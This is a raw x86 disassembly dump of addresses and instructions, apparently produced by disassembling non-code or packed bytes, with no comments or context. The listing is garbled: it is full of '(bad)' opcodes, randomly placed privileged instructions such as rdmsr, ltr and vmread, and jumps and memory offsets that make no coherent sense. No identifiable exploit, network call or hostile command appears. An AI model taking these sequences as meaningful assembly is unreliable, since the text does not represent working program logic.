  4315ca:	rdpmc  
  4315cc:	add    BYTE PTR [ebx],al
  4315ce:	push   ax
  4315d0:	lea    eax,[ebp-0x1]
  4315d6:	js     0x4315d7
  4315d8:	add    al,bh
  4315da:	push   bp
  4315dc:	lea    ecx,[ebp-0x7701]
  4315e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4315e8:	(bad)  
  4315e9:	(bad)  
  4315ea:	(bad)  
  4315eb:	(bad)  
  4315ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4315f2:	dec    eax
  4315f3:	mov    eax,0x8d8dffff
  4315f8:	mov    al,0xb0
  4315fa:	(bad)  
  4315fb:	call   DWORD PTR [ecx+0x50]
  4315fe:	dec    ebp
  4315ff:	inc    ebp
  431600:	mov    esi,0x7030833
  431605:	push   eax
  431606:	into   
  431607:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43160d:	call   DWORD PTR [ecx-0x8]
  431610:	lea    edx,[ebp-0x1]
  431613:	jmp    0x761817
  431618:	inc    eax
  431619:	jnp    0x4315a8
  43161b:	add    dh,bh
  43161d:	inc    WORD PTR [ebp-0x8a00b0]
  431624:	mov    edx,eax
  431626:	inc    esp
  431627:	add    bh,bh
  431629:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43162f:	dec    DWORD PTR [ebx-0x7f820301]
  431635:	add    BYTE PTR [ecx],al
  431637:	data16 add BYTE PTR [ebp-0xb30077],al
  43163e:	inc    eax
  431640:	(bad)  
  431641:	dec    si
  431643:	test   edi,edi
  431645:	(bad)  
  431646:	cmp    edi,edi
  431648:	add    ecx,DWORD PTR [edi-0x39]
  43164b:	mov    edx,DWORD PTR [edx+0x66]
  43164e:	inc    DWORD PTR [ebp-0x3d00cb]
  431654:	mov    eax,0x66ff8b5e
  43165a:	jmp    0xb4ff:0xc7ff3895
  431661:	push   ecx
  431662:	inc    DWORD PTR [ebx-0x76ffccbb]
  431668:	call   DWORD PTR [esi-0x1]
  43166b:	dec    DWORD PTR [eax]
  43166d:	mov    ecx,0x805ff
  431672:	inc    ebp
  431673:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431679:	mov    ecx,0x35784
  43167e:	add    BYTE PTR [ecx-0xffa59b],cl
  431684:	inc    ebp
  431685:	mov    ecx,0x9c6131
  43168a:	(bad)  
  43168b:	mov    eax,ebx
  43168d:	pop    esp
  43168e:	test   edi,edi
  431690:	clc    
  431691:	lea    eax,[ebp-0x24]
  431694:	cmp    eax,0xc7fe9c8d
  431699:	push   eax
  43169b:	lea    eax,[ebp+0x45fff8fe]
  4316a1:	mov    esi,DWORD PTR [ecx]
  4316a3:	hlt    
  4316a4:	lahf   
  4316a5:	push   esp
  4316a6:	mov    edx,DWORD PTR [ecx-0x4]
  4316a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316af:	add    BYTE PTR [ebp-0x35],al
  4316b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316b8:	mov    edx,DWORD PTR [ecx-0x74]
  4316bb:	rol    BYTE PTR [eax],0x8d
  4316be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316c2:	nop
  4316c3:	push   ecx
  4316c4:	add    bh,bh
  4316c6:	mov    esp,edi
  4316c8:	in     al,0x85
  4316ca:	jge    0x4316ca
  4316cc:	test   edi,edi
  4316ce:	jne    0x431655
  4316d0:	(bad)  
  4316d1:	(bad)  
  4316d2:	sbb    bh,bh
  4316d4:	push   ebp
  4316d5:	inc    ebp
  4316d6:	call   0xffdc1166
  4316db:	add    BYTE PTR [ebp+0x66],al
  4316de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316e4:	cmp    al,0x85
  4316e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4316ea:	test   DWORD PTR [edi+0x74],ecx
  4316ed:	dec    edi
  4316ee:	inc    DWORD PTR [ebp-0x530004]
  4316f4:	dec    DWORD PTR [edi-0x75]
  4316f7:	dec    esi
  4316f8:	cld    
  4316f9:	test   DWORD PTR [eax+0xff01ff],eax
  4316ff:	icebp  
  431700:	add    BYTE PTR [edi-0x3a],cl
  431703:	test   ebx,eax
  431705:	inc    BYTE PTR [ebp-0x1]
  431708:	jne    0x43170a
  43170a:	mov    eax,DWORD PTR [eax]
  43170c:	cld    
  43170d:	xor    BYTE PTR [ecx+0x500155],cl
  431713:	push   ebp
  431714:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43171a:	add    BYTE PTR [ebp+0x35e90f50],al
  431720:	add    al,BYTE PTR [eax]
  431722:	add    BYTE PTR [ebx-0x38fe4f80],al
  431728:	add    ah,ch
  43172a:	or     BYTE PTR [ebp+0x4501f845],dh
  431730:	jmp    0xdf1a26
  431735:	(bad)  
  431736:	nop    ecx
  431739:	test   DWORD PTR [ebp+0x4502f8],eax
  43173f:	xor    ecx,DWORD PTR [ebp-0x64]
  431742:	mov    eax,edi
  431744:	mov    ebx,DWORD PTR [eax+edx*2]
  431747:	add    eax,0x45fef885
  43174c:	dec    DWORD PTR [ebx+0x339445]
  431752:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431758:	dec    DWORD PTR [ebx-0x460f0375]
  43175e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175f:	add    esi,edi
  431761:	add    bh,bh
  431763:	rdpmc  
  431765:	add    BYTE PTR [ebx],0x1
  431768:	mov    DWORD PTR [eax],eax
  43176a:	add    al,0x45
  43176c:	dec    DWORD PTR [ecx-0x360b3373]
  431772:	dec    DWORD PTR [esi]
  431774:	push   eax
  431775:	jne    0x4317bc
  431777:	mov    esi,DWORD PTR [ebx]
  431779:	cld    
  43177a:	add    esp,ecx
  43177c:	push   eax
  43177d:	inc    DWORD PTR [ebp-0x75]
  431780:	add    eax,0x800e4
  431785:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43178b:	mov    DWORD PTR [ecx],eax
  43178d:	sbb    al,0x0
  43178f:	leave  
  431790:	test   DWORD PTR [edi-0x2],eax
  431793:	jne    0x431794
  431795:	call   0xff44019a
  43179a:	xor    BYTE PTR [ebp+0x4d],al
  43179d:	mov    edi,edi
  43179f:	enter  0x8,0x4d
  4317a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317a9:	mov    eax,DWORD PTR [eax]
  4317ab:	cld    
  4317ac:	add    DWORD PTR [ecx],ebx
  4317ae:	inc    ebp
  4317af:	dec    ebp
  4317b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317b6:	inc    eax
  4317b7:	dec    DWORD PTR [ecx-0x270375]
  4317bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4317c3:	xchg   ecx,eax
  4317c4:	ret    
  4317c5:	add    BYTE PTR [ebp-0x830075],al
  4317cb:	add    BYTE PTR [ebp-0x75],al
  4317ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317d4:	lea    edi,[edi-0xc]
  4317d7:	add    bh,bh
  4317d9:	mov    edx,DWORD PTR [eax-0x7b]
  4317dc:	inc    ebp
  4317dd:	rdpmc  
  4317df:	jne    0x4317e4
  4317e1:	add    BYTE PTR [eax-0x75],dl
  4317e4:	inc    ebp
  4317e5:	clc    
  4317e6:	add    eax,0x400009
  4317eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4317f1:	mov    eax,DWORD PTR [ecx]
  4317f3:	in     al,dx
  4317f4:	add    dh,al
  4317f6:	test   ebx,eax
  4317f8:	inc    BYTE PTR [ebp-0xff0001]
  4317fe:	add    BYTE PTR [ebp-0x43],al
  431801:	cmp    esi,0xfffffff8
  431804:	(bad)  
  431805:	push   DWORD PTR [eax]
  431807:	add    BYTE PTR [ebp-0x3a],dl
  43180a:	test   ebx,eax
  43180c:	je     0x431793
  43180e:	mov    edi,edi
  431810:	sbb    al,0xff
  431812:	test   DWORD PTR gs:[eax],eax
  431815:	(bad)  
  431816:	js     0x431817
  431818:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43181e:	sub    eax,ebx
  431820:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431826:	add    eax,DWORD PTR [eax]
  431828:	dec    ebp
  431829:	push   eax
  43182a:	mov    al,BYTE PTR [ebp+0x1]
  43182d:	mov    eax,DWORD PTR [ebp-0x68]
  431830:	mov    eax,DWORD PTR [eax]
  431832:	sbb    bh,al
  431834:	or     ah,dh
  431836:	dec    ebp
  431837:	inc    DWORD PTR [eax+0x4]
  43183a:	push   ecx
  43183b:	add    BYTE PTR [edx-0x1],dh
  43183e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431844:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43184e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431854:	push   ecx
  431855:	cmp    BYTE PTR [ebx],al
  431857:	inc    ebp
  431858:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	in     al,0xff
  431862:	add    BYTE PTR [ebp+0x0],al
  431865:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43186b:	add    al,bh
  43186d:	(bad)  
  43186e:	jmp    0x8d85:0x74b0558d
  431875:	dec    DWORD PTR [eax]
  431877:	call   DWORD PTR [ebp-0x7b]
  43187a:	mov    edi,esi
  43187c:	lock call DWORD PTR [ebp-0x75]
  431880:	mov    esi,esp
  431882:	mov    ah,0xc6
  431884:	mov    bh,0xc3
  431886:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43188c:	add    DWORD PTR [eax],0x450050ff
  431892:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431898:	inc    edi
  43189a:	push   esp
  43189c:	jmp    0xcd00:0x650481ff
  4318a3:	mov    DWORD PTR [ebx],esi
  4318a5:	clc    
  4318a6:	cmp    edi,0xff9cff3c
  4318ac:	jne    0x4318b6
  4318ae:	mov    eax,eax
  4318b0:	add    esi,DWORD PTR [eax]
  4318b2:	int3   
  4318b3:	inc    ebp
  4318b4:	cmp    al,0x83
  4318b6:	add    BYTE PTR [eax],bl
  4318b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318c4:	mov    edi,eax
  4318c6:	cmp    BYTE PTR [ebp+0x45],cl
  4318c9:	jmp    0x431856
  4318cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318ce:	inc    ebp
  4318cf:	or     al,0x2
  4318d1:	dec    DWORD PTR [ebp+0x18]
  4318d4:	jne    0x43192b
  4318d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318dc:	mov    edi,DWORD PTR [ebx]
  4318de:	in     al,0x50
  4318e0:	xchg   ecx,eax
  4318e1:	jmp    0x34367e6
  4318e6:	adc    al,0x8b
  4318e8:	inc    ebp
  4318e9:	mov    al,ds:0x8b04008b
  4318ee:	push   ebp
  4318ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4318f5:	push   ebp
  4318f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4318fc:	inc    ebp
  4318fd:	dec    ebp
  4318fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431904:	mov    DWORD PTR [eax],0xe9ff00f4
  43190a:	add    al,0x0
  43190c:	add    BYTE PTR [eax],al
  43190e:	mov    eax,edx
  431910:	push   eax
  431911:	rol    DWORD PTR [ebp-0xf0177],1
  431917:	bound  eax,QWORD PTR [ebp+0x50]
  43191a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431920:	add    BYTE PTR [ecx+0x558df0ff],cl
  431926:	mov    al,0xf
  431928:	test   DWORD PTR [edx],edx
  43192a:	call   DWORD PTR [ebp-0x7a0001]
  431930:	(bad)  
  431931:	loop   0x431932
  431933:	jnp    0xc6990d39
  431939:	mov    eax,ebx
  43193b:	cmp    al,0x8b
  43193d:	(bad)  
  43193e:	cld    
  43193f:	shr    esi,0xc
  431942:	add    dl,al
  431944:	push   eax
  431945:	lea    eax,[ebp-0x1]
  431948:	mov    edx,esi
  43194a:	cwde   
  43194b:	cli    
  43194c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431952:	or     BYTE PTR [eax],cl
  431954:	inc    ebp
  431955:	dec    ebp
  431956:	inc    DWORD PTR [ebx+0x74803914]
  43195c:	add    DWORD PTR [ebx+0x451800],ecx
  431962:	call   DWORD PTR [eax+edx*1]
  431965:	add    ecx,DWORD PTR [ebp-0x34]
  431968:	push   edi
  431969:	adc    al,0x8
  43196b:	mov    edx,DWORD PTR [ebp-0x14]
  43196e:	mov    ecx,DWORD PTR [ebp+0x18]
  431971:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431975:	inc    DWORD PTR [eax+esi*8]
  431978:	inc    ebp
  431979:	stos   BYTE PTR es:[edi],al
  43197a:	mov    edx,DWORD PTR [ebp-0x4]
  43197d:	add    DWORD PTR [ebp-0x1c],eax
  431980:	mov    edx,DWORD PTR [ebp-0x70]
  431983:	cmp    eax,DWORD PTR [eax]
  431985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431986:	mov    eax,DWORD PTR [eax]
  431988:	cld    
  431989:	jae    0x43190b
  43198b:	add    eax,DWORD PTR [ecx]
  43198d:	clc    
  43198e:	add    BYTE PTR [eax+0x30],dl
  431991:	mov    DWORD PTR [ecx],esi
  431993:	clc    
  431994:	pop    ds
  431995:	inc    ebp
  431996:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43199c:	(bad)  
  43199d:	push   DWORD PTR [edi]
  43199f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319a5:	(bad)  
  4319a6:	jae    0x4319a7
  4319a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4319ae:	sub    eax,DWORD PTR [eax]
  4319b0:	add    eax,DWORD PTR [eax]
  4319b2:	mov    DWORD PTR [ecx+0x5f],eax
  4319b5:	mov    DWORD PTR [ebx-0x4],ebx
  4319b8:	ret    0xff
  4319bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319c1:	ret    
  4319c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319c8:	add    BYTE PTR [ebp-0x7d],al
  4319cb:	mov    DWORD PTR [eax],eax
  4319cd:	add    al,0x84
  4319cf:	inc    DWORD PTR [ecx]
  4319d1:	lea    eax,[eax]
  4319d3:	hlt    
  4319d4:	sar    bh,cl
  4319d6:	test   BYTE PTR [eax+0x1],dl
  4319d9:	inc    ebp
  4319da:	add    BYTE PTR [ebx],dh
  4319dc:	test   BYTE PTR [ebx],0x84
  4319df:	push   eax
  4319e0:	add    BYTE PTR [ebp+0x0],al
  4319e3:	add    eax,0x86
  4319e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4319ee:	add    BYTE PTR [ecx],al
  4319f0:	add    BYTE PTR [eax],al
  4319f2:	mov    esi,0x550030
  4319f7:	mov    ecx,DWORD PTR [edi]
  4319f9:	cld    
  4319fa:	fidiv  DWORD PTR [ebp+0x0]
  4319fd:	mov    edi,DWORD PTR [ecx]
  4319ff:	xor    BYTE PTR [eax+eax*1],0x84
  431a03:	add    eax,DWORD PTR [eax]
  431a05:	sbb    BYTE PTR [eax],al
  431a07:	jne    0x4319ba
  431a09:	mov    eax,DWORD PTR [ecx]
  431a0b:	sbb    BYTE PTR [eax],al
  431a0d:	mov    DWORD PTR [ebp-0x1],esp
  431a10:	add    BYTE PTR [eax+0x30e45ca],bh
  431a16:	ret    0xb7fc
  431a19:	dec    ebp
  431a1a:	or     al,0x89
  431a1c:	dec    ebp
  431a1d:	cld    
  431a1e:	cmovne ecx,DWORD PTR [eax-0x75]
  431a22:	add    edi,esp
  431a24:	seto   BYTE PTR [esi-0x72ffffff]
  431a2b:	inc    ebp
  431a2c:	adc    al,0x8b
  431a2e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a35:	cmp    DWORD PTR [edi+0x72],edx
  431a38:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a3e:	gs cmp al,0x0
  431a41:	je     0x431a19
  431a43:	push   eax
  431a44:	sar    BYTE PTR [eax],1
  431a46:	mov    bh,0x3e
  431a48:	push   cs
  431a49:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a4f:	add    DWORD PTR [ecx+0x12],ebp
  431a52:	dec    edx
  431a53:	(bad)  
  431a54:	mov    eax,edx
  431a56:	in     al,dx
  431a57:	adc    DWORD PTR [ecx],esi
  431a59:	pop    esi
  431a5a:	inc    ecx
  431a5b:	leave  
  431a5c:	or     DWORD PTR [eax],ebx
  431a5e:	gs push ebp
  431a60:	add    ah,ch
  431a62:	into   
  431a63:	in     al,dx
  431a64:	enter  0xb756,0xf0
  431a68:	push   cs
  431a69:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a73:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a79:	jnp    0x74439f81
  431a7f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a85:	add    BYTE PTR [edi],cl
  431a87:	mov    edi,DWORD PTR [ecx-0x78]
  431a8a:	ltr    WORD PTR [ecx-0x7b]
  431a8e:	dec    DWORD PTR [edi]
  431a90:	clc    
  431a91:	out    0x45,eax
  431a93:	add    BYTE PTR [eax],cl
  431a95:	cmp    ebx,0xffffff8c
  431a98:	jge    0x431a9a
  431a9a:	jb     0x431aac
  431a9c:	je     0x521b1c
  431aa2:	pop    edx
  431aa3:	push   esi
  431aa4:	mov    ecx,DWORD PTR [edi]
  431aa6:	in     al,dx
  431aa7:	rol    DWORD PTR [ebp+0x0],1
  431aaa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ab1:	cmp    DWORD PTR [ecx],0xfffffff0
  431ab4:	hlt    
  431ab5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431abb:	(bad)  
  431abd:	push   eax
  431abe:	jns    0xb842ff3c
  431ac4:	lock push cs
  431ac6:	ror    edx,0x3
  431ac9:	test   BYTE PTR [ecx+0x5500e800],cl
  431acf:	dec    eax
  431ad0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ad4:	(bad)  
  431ad5:	mov    esi,0x7f33ff5f
  431ada:	inc    eax
  431adb:	test   DWORD PTR [edx],eax
  431add:	je     0x431a9f
  431adf:	mov    ecx,ecx
  431ae1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431ae5:	and    eax,DWORD PTR [eax+0xf0103]
  431aeb:	jp     0x431ad9
  431aed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431af1:	add    edx,DWORD PTR [edi+0x74]
  431af4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431afa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b00:	je     0x431a85
  431b02:	cmp    eax,edi
  431b04:	js     0x431b29
  431b06:	add    eax,0xeb0fc003
  431b0b:	jns    0x431a98
  431b0d:	vmread DWORD PTR [ecx+0x45],ebx
  431b11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b17:	adc    al,0x8b
  431b19:	jge    0x431b2f
  431b1b:	mov    edi,DWORD PTR [eax-0x4]
  431b1e:	add    edi,DWORD PTR [edi]
  431b20:	or     bh,bh
  431b22:	push   ebp
  431b23:	push   es
  431b24:	mov    DWORD PTR [ebp-0x4],ebx
  431b27:	add    edi,esi
  431b29:	pop    es
  431b2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b30:	mov    DWORD PTR [esp+esi*8],ecx
  431b33:	inc    ebp
  431b34:	pop    ebp
  431b35:	xor    DWORD PTR [esi-0x4],0x3b
  431b39:	add    edx,DWORD PTR [ecx+edi*1]
  431b3c:	push   es
  431b3d:	clc    
  431b3e:	mov    bh,0xdb
  431b40:	jp     0x431af9
  431b42:	add    cl,BYTE PTR [esi]
  431b44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b4a:	test   edi,edi
  431b4c:	je     0x431b42
  431b4e:	mov    eax,ecx
  431b50:	or     BYTE PTR [ebx],al
  431b52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b58:	jbe    0x431bcc
  431b5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b60:	add    ecx,DWORD PTR [esi]
  431b62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b68:	add    eax,DWORD PTR [ebx-0x287af783]
  431b6e:	je     0x431bbd
  431b70:	mov    DWORD PTR [ecx],edi
  431b72:	mov    esi,eax
  431b74:	hlt    
  431b75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b7c:	jb     0x431b3e
  431b7e:	jmp    0x431b6b
  431b80:	xor    esi,DWORD PTR [ebx]
  431b82:	pop    edi
  431b83:	pop    esi
  431b84:	pop    ebx
  431b85:	ret    
  431b86:	ret    0x8b
  431b89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b8f:	xor    DWORD PTR [ecx],0xc
  431b92:	pushf  
  431b93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b99:	rdmsr  
  431b9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431ba2:	dec    ebp
  431ba3:	ret    
  431ba4:	mov    edi,DWORD PTR [esi-0x4]
  431ba7:	pop    eax
  431ba8:	dec    ebp
  431ba9:	jne    0x431b36
  431bab:	xor    edi,esp
  431bad:	inc    eax
  431bae:	dec    ebp
  431baf:	jbe    0x431c04
  431bb1:	inc    eax
  431bb2:	pop    ebp
  431bb3:	add    edx,DWORD PTR [esi+0x8]
  431bb6:	push   esp
  431bb7:	dec    eax
  431bb8:	push   ecx
  431bb9:	mov    eax,edi
  431bbb:	and    al,0xf0
  431bbd:	jo     0x431baa
  431bbf:	mov    eax,DWORD PTR [ebx]
  431bc1:	sbb    BYTE PTR [ebp+0x4d],cl
  431bc4:	mov    eax,DWORD PTR [ebx]
  431bc6:	nop
  431bc7:	or     BYTE PTR [eax],al
  431bc9:	jne    0x431c22
  431bcb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431bd1:	cld    
  431bd2:	xor    edi,edi
  431bd4:	add    edi,DWORD PTR [ebp+0x3]
  431bd7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bdd:	js     0x431b63
  431bdf:	jae    0x431be3
  431be1:	(bad)  
  431be3:	xor    al,0x5d
  431be5:	jmp    0x431b72
  431be7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431bee:	fdecstp 
  431bf0:	test   BYTE PTR [edi],ah
  431bf2:	add    bh,BYTE PTR [ebp+0x0]
  431bf5:	add    ebx,DWORD PTR [ebp-0x77]
  431bf8:	mov    edi,eax
  431bfa:	cmp    al,0x0
  431bfd:	adc    dh,BYTE PTR [ebx]
  431bff:	jge    0x431c04
  431c01:	mov    edi,DWORD PTR [ebx]
  431c03:	jl     0x431c14
  431c05:	clc    
  431c06:	dec    edi
  431c07:	jge    0x431c09
  431c09:	mov    eax,DWORD PTR [ebx]
  431c0b:	jb     0x431c15
  431c0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431c10:	mov    edi,edi
  431c12:	xor    edx,DWORD PTR [eax]
  431c14:	add    edi,DWORD PTR [ebx]
  431c16:	mov    DWORD PTR [ebp-0x10],edi
  431c19:	inc    edi
  431c1a:	pop    ebp
  431c1b:	jge    0x431c58
  431c1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c21:	mov    edx,0xc05d87f0
  431c26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c2a:	fimul  WORD PTR [eax]
  431c2c:	fist   WORD PTR [ebp+0x1c]
  431c2f:	in     al,dx
  431c30:	jne    0x431c1e
  431c32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c3c:	fdivp  st(0),st
  431c3e:	fild   WORD PTR [ebp+0x4510f85c]
  431c44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c4a:	inc    ebp
  431c4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c51:	mov    ebp,DWORD PTR [ebx-0x4]
  431c54:	adc    al,0x8b
  431c56:	rcl    DWORD PTR [eax],0x48
  431c59:	mov    esi,0x7080803
  431c5e:	fiadd  WORD PTR [ebp+0x4d]
  431c61:	(bad)  
  431c62:	mov    edx,DWORD PTR [edx-0x4]
  431c65:	mov    edx,DWORD PTR [ebp-0x4]
  431c68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c6e:	mov    DWORD PTR [edi+0x872dc],edi
  431c74:	xlat   BYTE PTR ds:[ebx]
  431c75:	into   
  431c76:	ffreep st(6)
  431c78:	retf   0x6c7
  431c7b:	iret   
  431c7c:	dec    ebp
  431c7d:	inc    ebp
  431c7e:	mov    DWORD PTR [ebx],edi
  431c80:	fmul   QWORD PTR [edi]
  431c82:	dec    ebp
  431c83:	jnp    0x431cb8
  431c85:	add    BYTE PTR [ebx],al
  431c87:	mov    ecx,DWORD PTR [esp+edi*8]
  431c8a:	inc    ebp
  431c8b:	dec    ebp
  431c8c:	lea    esi,[ebx]
  431c8e:	add    DWORD PTR [ebx],eax
  431c90:	jb     0x431ccd
  431c92:	add    BYTE PTR [edi],cl
  431c94:	inc    ebp
  431c95:	imul   eax,edi,0x858bd800
  431c9b:	cld    
  431c9c:	clc    
  431c9d:	mov    DWORD PTR [ebp+0x0],eax
  431ca0:	inc    DWORD PTR [eax]
  431ca2:	or     al,0xde
  431ca4:	sbb    bh,0x1
  431ca7:	retf   
  431ca8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431caf:	dec    ebp
  431cb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cb6:	enter  0x12de,0xdf
  431cba:	inc    ebp
  431cbb:	pop    ebp
  431cbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cc2:	add    DWORD PTR [edx],edx
  431cc4:	add    BYTE PTR [ebp+0x50],dl
  431cc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ccd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431cd3:	or     ah,al
  431cd5:	pop    ss
  431cd6:	cdq    
  431cd7:	push   ebp
  431cd8:	clc    
  431cd9:	mov    eax,DWORD PTR [ebp-0x4]
  431cdc:	xor    edx,edx
  431cde:	add    esi,DWORD PTR [ebx]
  431ce0:	cmp    eax,DWORD PTR [ebx]
  431ce2:	hlt    
  431ce3:	cmp    DWORD PTR [ebx],esp
  431ce5:	or     al,BYTE PTR [ebp+0xf]
  431ce8:	mov    eax,DWORD PTR [edx]
  431cea:	loopne 0x431cec
  431cec:	(bad)  
  431ced:	mov    ecx,esi
  431cef:	cld    
  431cf0:	pushf  
  431cf1:	pop    ebp
  431cf2:	fwait
  431cf3:	mov    esi,DWORD PTR [edx]
  431cf5:	lock mov eax,eax
  431cf8:	adc    BYTE PTR [ebx],al
  431cfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d07:	dec    ebp
  431d08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d0e:	(bad)  
  431d0f:	iret   
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	jne    0x431d61
  431d14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d1a:	(bad)  
  431d1b:	cmp    ebx,eax
  431d1d:	je     0x431ca5
  431d1f:	add    edi,edi
  431d21:	or     bh,bh
  431d23:	dec    ebp
  431d24:	inc    ebp
  431d25:	mov    esi,DWORD PTR [ebx]
  431d27:	cld    
  431d28:	add    ecx,esi
  431d2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431d2d:	mov    edx,DWORD PTR [edi]
  431d2f:	or     BYTE PTR [ebp-0x7c],al
  431d32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d38:	test   BYTE PTR [ebx+ebx*4],cl
  431d3b:	inc    ebp
  431d3c:	xor    bh,BYTE PTR [esi]
  431d3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d45:	jne    0x431d0e
  431d47:	mov    ebp,esp
  431d49:	fcomp  DWORD PTR [ebx]
  431d4b:	add    BYTE PTR [ecx],al
  431d4d:	inc    DWORD PTR [ebp-0x75]
  431d50:	(bad)  
  431d51:	cld    
  431d52:	add    al,0xce
  431d54:	mov    ecx,edi
  431d56:	cld    
  431d57:	inc    ebp
  431d58:	fidivr WORD PTR [ebx]
  431d5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431d5d:	mov    eax,DWORD PTR [eax]
  431d5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d65:	fadd   st,st(7)
  431d67:	add    BYTE PTR [ebp-0x1],al
  431d6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431d6d:	inc    ebp
  431d6e:	mov    bh,0xc7
  431d71:	loopne 0x431db8
  431d73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d79:	sbb    dh,BYTE PTR [ebx]
  431d7b:	pushf  
  431d7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d82:	mov    eax,edi
  431d84:	cwde   
  431d85:	inc    ebp
  431d86:	inc    ebp
  431d87:	jne    0x431d14
  431d89:	mov    esp,esp
  431d8b:	clc    
  431d8c:	add    al,0x4d
  431d8e:	mov    DWORD PTR [ebx],esi
  431d90:	or     al,0x33
  431d92:	inc    ebp
  431d93:	lea    ecx,[ebx-0x398d13fd]
  431d99:	add    bh,al
  431d9b:	inc    ebp
  431d9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431da3:	add    ebp,esp
  431da5:	shufps xmm1,xmm3,0xc7
  431da9:	(bad)  
  431daa:	jmp    0x748858d3
  431daf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431db5:	hlt    
  431db6:	mov    ecx,DWORD PTR [edi]
